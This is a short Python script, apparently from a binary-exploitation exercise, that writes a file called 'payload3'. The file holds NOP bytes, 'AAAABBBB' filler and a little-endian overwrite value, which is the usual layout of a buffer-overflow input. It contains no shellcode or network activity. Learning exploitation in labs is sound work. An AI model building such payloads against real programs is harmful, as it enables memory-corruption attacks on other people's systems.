
with open('payload3','wb') as f:
    f.write(b'\x90'*4)
    f.write(b'AAAABBBB')
    f.write(b'\x79\xed\xff\xff')  
    f.close() # ff ff ed 79

print("Payload created!")
